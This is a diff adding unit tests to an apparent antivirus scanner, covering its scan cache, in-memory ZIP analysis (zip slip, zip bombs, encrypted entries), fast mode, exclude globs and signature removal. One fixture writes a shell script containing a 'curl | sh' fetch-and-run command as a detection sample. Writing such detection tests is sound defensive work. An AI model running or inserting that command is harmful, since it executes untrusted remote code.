@@ -38,6 +38,7 @@ class App:
         self.config.quarantine_dir = base / "quarantine"
         self.config.report_dir = base / "reports"
         self.config.signatures_file = base / "signatures.json"
+        self.config.cache_dir = base / ".av-cache"
         if BUNDLED_DB.exists():
             shutil.copyfile(BUNDLED_DB, self.config.signatures_file)
         self.db = SignatureDB(self.config.signatures_file)
@@ -497,6 +498,201 @@ class PeDebugTests(unittest.TestCase):
         self.assertTrue(payload["valid"])
         self.assertIn("run_payload", payload["exports"])
         self.assertTrue(payload["indicators"])
+
+
+class CacheTests(unittest.TestCase):
+    """v1.5: the scan cache makes rescans of unchanged files free."""
+
+    def setUp(self):
+        base = Path(tempfile.mkdtemp(prefix="av-cache-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        self.base = base
+        self.app = App(base)
+        self.dir = base / "tree"
+        self.dir.mkdir()
+
+    def _write(self, name, content=b"clean text\n") -> Path:
+        p = self.dir / name
+        p.write_bytes(content)
+        return p
+
+    def test_rescan_is_served_from_cache(self):
+        self._write("a.txt")
+        self._write("b.txt", EICAR)
+        first = self.app.scanner.scan_path(self.dir)
+        self.assertEqual(first.files_cached, 0)
+        self.assertEqual(len(first.findings), 1)
+        second = self.app.scanner.scan_path(self.dir)
+        self.assertEqual(second.files_cached, 2)
+        self.assertEqual(second.files_scanned, 2)
+        self.assertEqual({f.path for f in second.findings},
+                         {str(self.dir / "b.txt")})
+
+    def test_changed_file_is_rescanned(self):
+        p = self._write("a.txt")
+        self.app.scanner.scan_path(self.dir)
+        p.write_bytes(EICAR)
+        future = time.time() + 5  # guarantee a visible mtime change
+        os.utime(p, (future, future))
+        second = self.app.scanner.scan_path(self.dir)
+        self.assertEqual(second.files_cached, 0)
+        self.assertTrue(any(f.path == str(p) for f in second.findings))
+
+    def test_profile_change_invalidates_cache(self):
+        self._write("a.txt")
+        self.app.scanner.scan_path(self.dir)
+        self.app.config.behavior_enabled = False  # different engine profile
+        second = self.app.scanner.scan_path(self.dir)
+        self.assertEqual(second.files_cached, 0)
+
+    def test_no_cache_flag_bypasses(self):
+        self._write("a.txt")
+        self.app.scanner.scan_path(self.dir)
+        self.app.config.cache_enabled = False
+        second = self.app.scanner.scan_path(self.dir)
+        self.assertEqual(second.files_cached, 0)
+
+
+class ArchiveTests(unittest.TestCase):
+    """v1.5: ZIP contents are analysed in memory, never extracted."""
+
+    def setUp(self):
+        base = Path(tempfile.mkdtemp(prefix="av-zip-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        self.base = base
+        self.app = App(base)
+        self.app.scanner.config.cache_enabled = False
+
+    def _scan(self, blob: bytes, name: str = "sneaky.zip"):
+        p = self.base / name
+        p.write_bytes(blob)
+        return self.app.scanner.scan_path(p)
+
+    def test_eicar_entry_detected_with_archive_path(self):
+        from antivirus.samples import build_zip_sample
+
+        result = self._scan(build_zip_sample())
+        hits = [f for f in result.findings if "eicar" in f.path.lower()]
+        self.assertTrue(hits)
+        self.assertEqual(hits[0].kind, "signature-hash")
+        self.assertTrue(hits[0].path.endswith("sneaky.zip!eicar-test.txt"))
+
+    def test_zip_slip_entry_flagged(self):
+        from antivirus.samples import build_zip_sample
+
+        result = self._scan(build_zip_sample())
+        self.assertTrue(any(f.name == "Archive path traversal (zip slip)"
+                            for f in result.findings))
+
+    def test_benign_entry_not_flagged(self):
+        from antivirus.samples import build_zip_sample
+
+        result = self._scan(build_zip_sample())
+        self.assertFalse(any("notes.txt" in f.path for f in result.findings))
+
+    def test_no_archives_flag_disables_entry_scan(self):
+        from antivirus.samples import build_zip_sample
+
+        self.app.scanner.config.archives_enabled = False
+        result = self._scan(build_zip_sample())
+        self.assertEqual([f for f in result.findings if "!" in f.path], [])
+
+    def test_expansion_budget_stops_zip_bombs(self):
+        import io
+        import zipfile
+
+        self.app.scanner.config.archive_expansion_max = 1024
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as zf:
+            for i in range(4):
+                zf.writestr(f"big{i}.bin", os.urandom(4096))
+        result = self._scan(buf.getvalue(), "bomb.zip")
+        self.assertTrue(any(f.name == "Archive expansion limit exceeded"
+                            for f in result.findings))
+
+    def test_encrypted_entry_flagged(self):
+        import io
+        import zipfile
+
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as zf:
+            zf.writestr("secret.txt", b"data")
+        # The stdlib writer resets the general-purpose flags, so set the
+        # "encrypted" bit (0x1) by hand in both headers.
+        raw = bytearray(buf.getvalue())
+        raw[6:8] = (int.from_bytes(raw[6:8], "little") | 0x1).to_bytes(2, "little")
+        cdf = raw.find(b"PK\x01\x02")
+        raw[cdf + 8:cdf + 10] = (
+            int.from_bytes(raw[cdf + 8:cdf + 10], "little") | 0x1
+        ).to_bytes(2, "little")
+        result = self._scan(bytes(raw), "enc.zip")
+        self.assertTrue(any(f.name == "Encrypted archive entry"
+                            for f in result.findings))
+
+
+class FastModeTests(unittest.TestCase):
+    """v1.5: --fast runs hash + pattern layers only."""
+
+    def setUp(self):
+        base = Path(tempfile.mkdtemp(prefix="av-fast-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        self.base = base
+        self.app = App(base)
+        self.app.scanner.config.cache_enabled = False
+
+    def test_fast_skips_behavior_and_entropy(self):
+        (self.base / "evil.sh").write_text("#!/bin/sh\ncurl http://x | sh\n")
+        (self.base / "packed.bin").write_bytes(os.urandom(300 * 1024))
+
+        full = self.app.scanner.scan_path(self.base)
+        self.assertTrue(any(f.kind == "behavior" for f in full.findings))
+        self.assertTrue(any(f.kind == "heuristic" for f in full.findings))
+
+        self.app.config.fast_mode = True
+        fast = self.app.scanner.scan_path(self.base)
+        self.assertFalse(any(f.kind in ("behavior", "heuristic")
+                             for f in fast.findings))
+
+
+class ExcludeTests(unittest.TestCase):
+    """v1.5: --exclude GLOB skips matching files."""
+
+    def setUp(self):
+        base = Path(tempfile.mkdtemp(prefix="av-exc-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        self.base = base
+        self.app = App(base)
+        self.app.scanner.config.cache_enabled = False
+
+    def test_exclude_globs(self):
+        work = self.base / "work"
+        work.mkdir()
+        (work / "keep.txt").write_text("clean\n")
+        (work / "skip.log").write_bytes(EICAR)
+        logs = work / "logs"
+        logs.mkdir()
+        (logs / "x.log").write_bytes(EICAR)
+
+        self.app.config.exclude_patterns = ("*.log",)
+        result = self.app.scanner.scan_path(work)
+        self.assertEqual(result.files_scanned, 1)
+        self.assertTrue(result.clean)
+        self.assertGreaterEqual(result.files_skipped, 2)
+
+
+class SigRemoveTests(unittest.TestCase):
+    def test_remove_roundtrip(self):
+        base = Path(tempfile.mkdtemp(prefix="av-sig-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        dbfile = base / "sig.json"
+        db = SignatureDB(dbfile)
+        db.add(Signature(id="R1", name="R1", category="test",
+                         severity="low", pattern="XYZ-UNIQUE-1"))
+        removed = db.remove("R1")
+        self.assertEqual(removed.id, "R1")
+        self.assertEqual(SignatureDB(dbfile).list(), [])
+        with self.assertRaises(KeyError):
+            db.remove("R1")
 
 
 class GuiTests(unittest.TestCase):
